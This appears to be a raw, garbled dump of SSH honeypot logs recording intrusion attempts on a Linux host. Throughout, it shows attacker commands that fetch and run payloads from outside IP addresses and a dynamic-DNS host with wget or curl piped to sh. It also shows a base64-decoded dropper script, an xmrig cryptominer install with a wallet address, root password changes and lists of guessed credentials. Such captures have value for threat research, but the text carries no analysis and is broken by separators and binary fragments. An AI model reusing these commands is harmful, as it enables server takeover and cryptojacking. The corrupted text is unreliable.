scp -|::|- -t -|::|- /tmp/wpAswCt9
rm -|::|- -rf -|::|- /var/tmp/dota*
3҉`e -|::|- echo -|::|- "root -|::|- Root123" -|::|- > -|::|- /tmp/up.txt -|::|- 3҉`v~
scp -|::|- -t -|::|- /tmp/cimszosn
user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- Linux -|::|- pouta.csc -|::|- linux -|::|- node -|::|- 5.4.0-70-generic -|::|- #78-Ubuntu -|::|- SMP -|::|- Fri -|::|- Mar -|::|- 19 -|::|- 13:29:52 -|::|- UTC -|::|- 2021 -|::|- x86_64 -|::|- GNU/Linux -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:/tmp$ -|::|- . -|::|- .. -|::|- .ICE-unix -|::|- .Test-unix -|::|- .X11-unix -|::|- .XIM-unix -|::|- .font-unix -|::|- snap.lxd -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-logind.service-HBlekf -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-resolved.service-eGkCdj -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-timesyncd.service-x4eSxi -|::|- user@pouta.csc -|::|- linux -|::|- node:/tmp$
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- head -|::|- -n -|::|- 1 -|::|- | -|::|- awk -|::|- '{print -|::|- $4,$5,$6,$7,$8,$9;}' -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @
scp -|::|- -t -|::|- /tmp/IhjJXTMA
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- sBFj54JU -|::|- && -|::|- bash -|::|- -c -|::|- ./sBFj54JU -|::|- -bash: -|::|- ./sBFj54JU: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- wc -|::|- -l
u!`v -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- q80t6JBH -|::|- && -|::|- bash -|::|- -c -|::|- ./q80t6JBH -|::|- u!`5 -|::|- -bash: -|::|- ./q80t6JBH: -|::|- command -|::|- not -|::|- found
-bash: -|::|- top: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 2Sb5fAJ0 -|::|- && -|::|- bash -|::|- -c -|::|- ./2Sb5fAJ0 -|::|- -bash: -|::|- ./2Sb5fAJ0: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- processor -|::|- vendor_id -|::|- : -|::|- GenuineIntel -|::|- cpu -|::|- family -|::|- model -|::|- : -|::|- 23 -|::|- model -|::|- name -|::|- : -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @ -|::|- 2.66GHz -|::|- stepping -|::|- cpu -|::|- MHz -|::|- : -|::|- 2133.304 -|::|- cache -|::|- size -|::|- : -|::|- 6144 -|::|- KB -|::|- physical -|::|- id -|::|- siblings -|::|- core -|::|- id -|::|- cpu -|::|- cores -|::|- apicid -|::|- initial -|::|- apicid -|::|- : -|::|- yes -|::|- fpu_exception -|::|- : -|::|- yes -|::|- cpuid -|::|- level -|::|- : -|::|- 10 -|::|- : -|::|- yes -|::|- flags -|::|- : -|::|- fpu -|::|- vme -|::|- de -|::|- pse -|::|- tsc -|::|- msr -|::|- pae -|::|- mce -|::|- cx8 -|::|- apic -|::|- sep -|::|- mtrr -|::|- pge -|::|- mca -|::|- cmov -|::|- pat -|::|- pse36 -|::|- clflush -|::|- dts -|::|- acpi -|::|- mmx -|::|- fxsr -|::|- sse -|::|- sse2 -|::|- ss -|::|- ht -|::|- tm -|::|- pbe -|::|- syscall -|::|- nx -|::|- lm -|::|- constant_tsc -|::|- arch_perfmon -|::|- pebs -|::|- bts -|::|- rep_good -|::|- pni -|::|- monitor -|::|- ds_cpl -|::|- vmx -|::|- smx -|::|- est -|::|- tm2 -|::|- ssse3 -|::|- cx16 -|::|- xtpr -|::|- sse4_1 -|::|- lahf_lm -|::|- bogomips -|::|- : -|::|- 4270.03 -|::|- clflush -|::|- size -|::|- : -|::|- 64 -|::|- cache_alignment -|::|- : -|::|- 64 -|::|- address -|::|- sizes -|::|- : -|::|- 36 -|::|- bits -|::|- physical, -|::|- 48 -|::|- bits -|::|- virtual -|::|- power -|::|- management: -|::|- processor -|::|- vendor_id -|::|- : -|::|- GenuineIntel -|::|- cpu -|::|- family -|::|- model -|::|- : -|::|- 23 -|::|- model -|::|- name -|::|- : -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @ -|::|- 2.66GHz -|::|- stepping -|::|- cpu -|::|- MHz -|::|- : -|::|- 2133.304 -|::|- cache -|::|- size -|::|- : -|::|- 6144 -|::|- KB -|::|- physical -|::|- id -|::|- siblings -|::|- core -|::|- id -|::|- cpu -|::|- cores -|::|- apicid -|::|- initial -|::|- apicid -|::|- : -|::|- yes -|::|- fpu_exception -|::|- : -|::|- yes -|::|- cpuid -|::|- level -|::|- : -|::|- 10 -|::|- : -|::|- yes -|::|- flags -|::|- : -|::|- fpu -|::|- vme -|::|- de -|::|- pse -|::|- tsc -|::|- msr -|::|- pae -|::|- mce -|::|- cx8 -|::|- apic -|::|- sep -|::|- mtrr -|::|- pge -|::|- mca -|::|- cmov -|::|- pat -|::|- pse36 -|::|- clflush -|::|- dts -|::|- acpi -|::|- mmx -|::|- fxsr -|::|- sse -|::|- sse2 -|::|- ss -|::|- ht -|::|- tm -|::|- pbe -|::|- syscall -|::|- nx -|::|- lm -|::|- constant_tsc -|::|- arch_perfmon -|::|- pebs -|::|- bts -|::|- rep_good -|::|- pni -|::|- monitor -|::|- ds_cpl -|::|- vmx -|::|- smx -|::|- est -|::|- tm2 -|::|- ssse3 -|::|- cx16 -|::|- xtpr -|::|- sse4_1 -|::|- lahf_lm -|::|- bogomips -|::|- : -|::|- 4266.61 -|::|- clflush -|::|- size -|::|- : -|::|- 64 -|::|- cache_alignment -|::|- : -|::|- 64 -|::|- address -|::|- sizes -|::|- : -|::|- 36 -|::|- bits -|::|- physical, -|::|- 48 -|::|- bits -|::|- virtual -|::|- power -|::|- management:
jQ`S -|::|- echo -|::|- "root -|::|- temp123" -|::|- > -|::|- /tmp/up.txt -|::|- jQ`Ճ
D#`D -|::|- echo -|::|- "root -|::|- abcd-1234 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- D#`?
GQ`C -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Gejkgvqi -|::|- && -|::|- bash -|::|- -c -|::|- ./Gejkgvqi -|::|- GQ` -|::|- -bash: -|::|- ./Gejkgvqi: -|::|- command -|::|- not -|::|- found
3`G- -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- JgxvyD7y -|::|- && -|::|- bash -|::|- -c -|::|- ./JgxvyD7y -|::|- -bash: -|::|- ./JgxvyD7y: -|::|- command -|::|- not -|::|- found -|::|- 3`h:
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- iXBLMgmb -|::|- && -|::|- bash -|::|- -c -|::|- ./iXBLMgmb -|::|- -bash: -|::|- ./iXBLMgmb: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/5obYfVTI -|::|- >`&A -|::|- >`UA -|::|- >`AB
ubuntu@pouta.csc -|::|- linux -|::|- node:~$ -|::|- v`I] -|::|- -bash: -|::|- top: -|::|- command -|::|- not -|::|- found -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:~$ -|::|- x`.D -|::|- x`'N -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- x`aO -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:~$ -|::|- x`Ih -|::|- y`_b -|::|- y`{. -|::|- y`x2 -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- {`ky -|::|- {`U7 -|::|- {`kQ -|::|- {`[V -|::|- wget: -|::|- missing -|::|- URL -|::|- Usage: -|::|- wget -|::|- [OPTION]... -|::|- [URL]... -|::|- Try -|::|- `wget -|::|- --help' -|::|- for -|::|- more -|::|- options. -|::|- {`QW -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- curl: -|::|- try -|::|- 'curl -|::|- --help' -|::|- or -|::|- 'curl -|::|- --manual' -|::|- for -|::|- more -|::|- information -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- }`1# -|::|- ~`%E -|::|- ~`(F -|::|- ~`I2 -|::|- --2021-05-13 -|::|- 04:01:04-- -|::|- http://krane.ddns.net/krax -|::|- Connecting -|::|- to -|::|- krane.ddns.net:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 3096097 -|::|- (2M) -|::|- [text/whatever] -|::|- Saving -|::|- to: -|::|- `/dev/shm/krax' -|::|- 0% -|::|- [> -|::|- ] -|::|- 5,322 -|::|- 14K/s -|::|- eta -|::|- 3m -|::|- 36s -|::|- 5% -|::|- [=> -|::|- ] -|::|- 174,658 -|::|- 179K/s -|::|- eta -|::|- 16s -|::|- 46% -|::|- [=================> -|::|- ] -|::|- 1,443,290 -|::|- 917K/s -|::|- eta -|::|- 1s -|::|- 100%[======================================>] -|::|- 3,096,097 -|::|- 917K/s -|::|- 2021-05-13 -|::|- 04:01:06 -|::|- (917 -|::|- KB/s) -|::|- - -|::|- `/dev/shm/krax' -|::|- saved -|::|- [3096097/3096097] -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- ._lul -|::|- ._lul/krn -|::|- ._lul/krane -|::|- ._lul/config.json -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- cd -|::|- ._lul/ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- sl: -|::|- command -|::|- not -|::|- found -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krn: -|::|- command -|::|- not -|::|- found -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- config.json -|::|- krane -|::|- krn -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krn: -|::|- command -|::|- not -|::|- found -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krane: -|::|- command -|::|- not -|::|- found -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$ -|::|- ubuntu@pouta.csc -|::|- linux -|::|- node:/dev/shm$

scp -|::|- -t -|::|- /tmp/4VwfB463 -|::|- \`#k -|::|- \`"l -|::|- \`]l
<`]E -|::|- echo -|::|- "root -|::|- P455w0rd" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- tzE6ezMO -|::|- && -|::|- bash -|::|- -c -|::|- ./tzE6ezMO -|::|- -bash: -|::|- ./tzE6ezMO: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- P@ssw0rd@1" -|::|- > -|::|- /tmp/up.txt
1c`~ -|::|- 1c`r -|::|- scp -|::|- -t -|::|- /tmp/nLXjxExB -|::|- 1c`ƅ -|::|- 1c`5 -|::|- 1c`b -|::|- 1c`P
ifconfig -|::|- eth0 -|::|- Link -|::|- encap:Ethernet -|::|- HWaddr -|::|- 67:c1:6c:a4:cc:3f -|::|- inet -|::|- addr:192.168.1.12 -|::|- Bcast:192.168.1.255 -|::|- Mask:255.255.255.0 -|::|- inet6 -|::|- addr: -|::|- fe23::28e:43ff:fe59:9601/64 -|::|- Scope:Link -|::|- UP -|::|- BROADCAST -|::|- RUNNING -|::|- MULTICAST -|::|- MTU:1500 -|::|- Metric:1 -|::|- RX -|::|- packets:544420 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- frame:0 -|::|- TX -|::|- packets:505216 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- carrier:0 -|::|- collisions:0 -|::|- txqueuelen:1000 -|::|- RX -|::|- bytes:486084848 -|::|- (486.1 -|::|- MB) -|::|- TX -|::|- bytes:39244038 -|::|- (39.2 -|::|- MB) -|::|- lo -|::|- Link -|::|- encap:Local -|::|- Loopback -|::|- inet -|::|- addr:127.0.0.1 -|::|- Mask:255.0.0.0 -|::|- inet6 -|::|- addr: -|::|- ::1/128 -|::|- Scope:Host -|::|- UP -|::|- LOOPBACK -|::|- RUNNING -|::|- MTU:65536 -|::|- Metric:1 -|::|- RX -|::|- packets:110 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- frame:0 -|::|- TX -|::|- packets:110 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- carrier:0 -|::|- collisions:0 -|::|- txqueuelen:0 -|::|- RX -|::|- bytes:36825903 -|::|- (36.8 -|::|- MB) -|::|- TX -|::|- bytes:36825903 -|::|- (36.8 -|::|- MB)
echo -|::|- "root -|::|- admin32 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- &`dw
uptime -|::|- 05:45:21 -|::|- up -|::|- 4 -|::|- days, -|::|- 9:57, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00
EQ`@ -|::|- EQ`I -|::|- scp -|::|- -t -|::|- /tmp/Gejkgvqi -|::|- EQ`{ -|::|- EQ`+ -|::|- EQ`d
scp -|::|- -t -|::|- /tmp/FsfufM4B -|::|- /`V? -|::|- /`(@ -|::|- /`i@ -|::|- /`+A -|::|- /`XA
echo -|::|- "qwer`123\n20cBaYmtZ6ev\n20cBaYmtZ6ev\n"|passwd -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
;`PE -|::|- echo -|::|- "root -|::|- !@#cnidc" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 8Iv1YM0T -|::|- && -|::|- bash -|::|- -c -|::|- ./8Iv1YM0T -|::|- -bash: -|::|- ./8Iv1YM0T: -|::|- command -|::|- not -|::|- found
echo -|::|- "qwer`123\nf5j4hCWTLakZ\nf5j4hCWTLakZ\n"|passwd -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
wu`G -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt -|::|- || -|::|- cd -|::|- /root -|::|- || -|::|- cd -|::|- /; -|::|- wget -|::|- 209.141.58.203/ssh -|::|- || -|::|- curl -|::|- -o -|::|- ssh -|::|- 209.141.58.203/ssh; -|::|- tar -|::|- xvf -|::|- ssh; -|::|- cd -|::|- .ssh; -|::|- chmod -|::|- +x -|::|- *; -|::|- ./sshd; -|::|- ./krane -|::|- admin -|::|- --2021-05-15 -|::|- 07:17:11-- -|::|- http://209.141.58.203/ssh -|::|- Connecting -|::|- to -|::|- 209.141.58.203:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- wu`} -|::|- 200 -|::|- OK -|::|- wu`З -|::|- Length: -|::|- 3095989 -|::|- (2M) -|::|- [text/whatever] -|::|- wu`" -|::|- Saving -|::|- to: -|::|- `/ssh' -|::|- wu`̘ -|::|- 0% -|::|- [> -|::|- ] -|::|- 13,650 -|::|- 31K/s -|::|- eta -|::|- 1m -|::|- 36s -|::|- xu`_ -|::|- 5% -|::|- [=> -|::|- ] -|::|- 163,554 -|::|- 150K/s -|::|- eta -|::|- 19s -|::|- yu`X -|::|- 24% -|::|- [=========> -|::|- ] -|::|- 766,770 -|::|- 471K/s -|::|- eta -|::|- 4s -|::|- 62% -|::|- [========================> -|::|- ] -|::|- 1,945,746 -|::|- 871K/s -|::|- eta -|::|- 1s -|::|- zu`Y -|::|- 89% -|::|- [==================================> -|::|- ] -|::|- 2,763,578 -|::|- 991K/s -|::|- eta -|::|- 0s -|::|- zu`< -|::|- 100%[======================================>] -|::|- 3,095,989 -|::|- 991K/s -|::|- 2021-05-15 -|::|- 07:17:14 -|::|- (991 -|::|- KB/s) -|::|- - -|::|- `/ssh' -|::|- saved -|::|- [3095989/3095989] -|::|- zu`> -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- zu`r -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- |u`~ -|::|- 100 -|::|- 3095989.0 -|::|- 100 -|::|- 3095989.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- |u`}/ -|::|- .ssh -|::|- |u`0 -|::|- .ssh/config.json -|::|- |u`(1 -|::|- .ssh/sshd -|::|- |u`L. -|::|- .ssh/krane -|::|- |u`+3 -|::|- -bash: -|::|- ./sshd: -|::|- command -|::|- not -|::|- found -|::|- |u`4 -|::|- -bash: -|::|- ./krane: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/JgxvyD7y
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 4nJFYqXl -|::|- && -|::|- bash -|::|- -c -|::|- ./4nJFYqXl -|::|- -bash: -|::|- ./4nJFYqXl: -|::|- command -|::|- not -|::|- found
^+`j -|::|- echo -|::|- "root -|::|- 25umet#2^10 -|::|- " -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/29e15QrH
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- b1OxqJDe -|::|- && -|::|- bash -|::|- -c -|::|- ./b1OxqJDe -|::|- -bash: -|::|- ./b1OxqJDe: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- q1H3J2X7 -|::|- && -|::|- bash -|::|- -c -|::|- ./q1H3J2X7 -|::|- -bash: -|::|- ./q1H3J2X7: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- XxUaqqOB -|::|- && -|::|- bash -|::|- -c -|::|- ./XxUaqqOB -|::|- -bash: -|::|- ./XxUaqqOB: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- rootpassword" -|::|- > -|::|- /tmp/up.txt
7g`Q -|::|- 7g`S -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- M01GZwRG -|::|- && -|::|- bash -|::|- -c -|::|- ./M01GZwRG -|::|- 7g`<b -|::|- -bash: -|::|- ./M01GZwRG: -|::|- command -|::|- not -|::|- found -|::|- 7g`e
wget -|::|- -qO -|::|- - -|::|- http://71.127.148.69/.x/1sh -|::|- | -|::|- sh -|::|- > -|::|- /dev/null -|::|- 2>&1 -|::|- &
free -|::|- -m -|::|- | -|::|- grep -|::|- Mem -|::|- | -|::|- awk -|::|- '{print -|::|- $2 -|::|- ,$3, -|::|- $4, -|::|- $5, -|::|- $6, -|::|- $7}' -|::|- 16010 -|::|- 728 -|::|- 10380 -|::|- 1 -|::|- 4901 -|::|- 15386
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- UzwmZBx0 -|::|- && -|::|- bash -|::|- -c -|::|- ./UzwmZBx0 -|::|- -bash: -|::|- ./UzwmZBx0: -|::|- command -|::|- not -|::|- found
cat -|::|- /etc/issue; -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
C`:} -|::|- #!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://125.26.22.53/scripts/23 -|::|- curl -|::|- -O -|::|- http://125.26.22.53/scripts/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- wget -|::|- http://125.26.22.53/scripts/23s -|::|- curl -|::|- -O -|::|- http://125.26.22.53/scripts/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s -|::|- rm -|::|- -rf -|::|- 23.sh
echo -|::|- "root -|::|- busy -|::|- " -|::|- > -|::|- /tmp/up.txt
echo -|::|- 'root:root'>/tmp/up.txt
3%`` -|::|- echo -|::|- "root -|::|- clear!@# -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- 3%`Co
c`0l -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- V1Y2k0gD -|::|- && -|::|- bash -|::|- -c -|::|- ./V1Y2k0gD -|::|- -bash: -|::|- ./V1Y2k0gD: -|::|- command -|::|- not -|::|- found -|::|- c`Uz
!`gK -|::|- !`bL -|::|- scp -|::|- -t -|::|- /tmp/UzwmZBx0 -|::|- !`qR -|::|- !`DS -|::|- !`pS -|::|- !`QW
scp -|::|- -t -|::|- /tmp/2wwZXGjq
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 29e15QrH -|::|- && -|::|- bash -|::|- -c -|::|- ./29e15QrH -|::|- -bash: -|::|- ./29e15QrH: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- gmaj -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- 0`Q!
scp -|::|- -t -|::|- /tmp/Pe48ZWCL
user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- AS1741 -|::|- CSC -|::|- - -|::|- Tieteen -|::|- tietotekniikan -|::|- keskus -|::|- Oy -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- Try -|::|- `shutdown -|::|- --help' -|::|- for -|::|- more -|::|- information. -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$
.`s( -|::|- echo -|::|- "root -|::|- pass0 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- .`+p
scp -|::|- -t -|::|- /tmp/fUZbZWCy
#!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://182.53.197.62/centaur-docs/23 -|::|- curl -|::|- -O -|::|- http://182.53.197.62/centaur-docs/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- wget -|::|- http://182.53.197.62/centaur-docs/23s -|::|- curl -|::|- -O -|::|- http://182.53.197.62/centaur-docs/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s
echo -|::|- "user -|::|- Huawei12#$" -|::|- > -|::|- /tmp/up.txt
sleep -|::|- 15s -|::|- && -|::|- cd -|::|- /var/tmp; -|::|- echo -|::|- #!/bin/bash
cd /tmp	
rm -rf .ssh
rm -rf .mountfs
rm -rf .X13-unix
rm -rf .X17-unix
rm -rf .X19-unix
mkdir .X19-unix
cd .X19-unix
mv /var/tmp/dota3.tar.gz dota3.tar.gz
tar xf dota3.tar.gz
sleep 3s && cd .rsync; cat /tmp/.X19-unix/.rsync/initall | bash 2>1&
sleep 45s && pkill -9 run && pkill -9 go && pkill -9 tsm
exit 0 -|::|- | -|::|- base64 -|::|- --decode -|::|- | -|::|- bash -|::|- ҉`gK
ls -|::|- -lh -|::|- $(which -|::|- ls) -|::|- ls: -|::|- cannot -|::|- access -|::|- /usr/local/bin/ls -|::|- /usr/bin/ls -|::|- /bin/ls -|::|- /usr/local/games/ls -|::|- /usr/games/ls: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
Tފ`u -|::|- Tފ`< -|::|- scp -|::|- -t -|::|- /tmp/r52q3e0X -|::|- Tފ`5 -|::|- Tފ`l -|::|- Uފ`2a
2c`Rp -|::|- 2c`p -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- nLXjxExB -|::|- && -|::|- bash -|::|- -c -|::|- ./nLXjxExB -|::|- 2c`z -|::|- -bash: -|::|- ./nLXjxExB: -|::|- command -|::|- not -|::|- found -|::|- 2c`X~
0O`s -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- e8eLilnd -|::|- && -|::|- bash -|::|- -c -|::|- ./e8eLilnd -|::|- -bash: -|::|- ./e8eLilnd: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- xvGMtotm -|::|- && -|::|- bash -|::|- -c -|::|- ./xvGMtotm -|::|- -bash: -|::|- ./xvGMtotm: -|::|- command -|::|- not -|::|- found
j)`i -|::|- echo -|::|- "root -|::|- qazqaz -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- j)`RU
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 2wwZXGjq -|::|- && -|::|- bash -|::|- -c -|::|- ./2wwZXGjq -|::|- -bash: -|::|- ./2wwZXGjq: -|::|- command -|::|- not -|::|- found
VU`o -|::|- cat -|::|- /etc/issue -|::|- VU`L -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- VU`m
"׉`K^ -|::|- "׉`^ -|::|- echo -|::|- "root -|::|- Apple@123" -|::|- > -|::|- /tmp/up.txt
҉`^m -|::|- echo -|::|- "root -|::|- zhang123" -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/8Iv1YM0T
user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- bzkxaVoK -|::|- && -|::|- bash -|::|- -c -|::|- ./bzkxaVoK -|::|- -bash: -|::|- ./bzkxaVoK: -|::|- command -|::|- not -|::|- found
2`XL -|::|- echo -|::|- "admin -|::|- P@ssword1" -|::|- > -|::|- /tmp/up.txt
echo -|::|- "root -|::|- ABCabc123456" -|::|- > -|::|- /tmp/up.txt
՜``x -|::|- scp -|::|- -t -|::|- /tmp/tzE6ezMO -|::|- ՜`}r
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Tgvp8gNP -|::|- && -|::|- bash -|::|- -c -|::|- ./Tgvp8gNP -|::|- -bash: -|::|- ./Tgvp8gNP: -|::|- command -|::|- not -|::|- found
echo -|::|- -e -|::|- "linix37*)@#BT"\nt5jqEYpv3To3\nt5jqEYpv3To3"|passwd|bash -|::|- TӞ`W -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file -|::|- UӞ`;
?H`] -|::|- ?H`# -|::|- nproc -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found
apt -|::|- update -|::|- -y; -|::|- apt -|::|- install -|::|- curl -|::|- -y; -|::|- cat -|::|- /etc/issue; -|::|- curl -|::|- -s -|::|- -L -|::|- https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh -|::|- | -|::|- bash -|::|- -s -|::|- 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa;timeout -|::|- 10 -|::|- top -|::|- -bash: -|::|- apt: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- apt: -|::|- command -|::|- not -|::|- found -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- -bash: -|::|- timeout: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- curl:: -|::|- command -|::|- not -|::|- found
curl -|::|- http://71.127.148.69/.x/3sh -|::|- | -|::|- sh
echo -|::|- "root -|::|- hg -|::|- " -|::|- > -|::|- /tmp/up.txt
echo -|::|- -e -|::|- "qwer`123\n20cBaYmtZ6ev\n20cBaYmtZ6ev"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
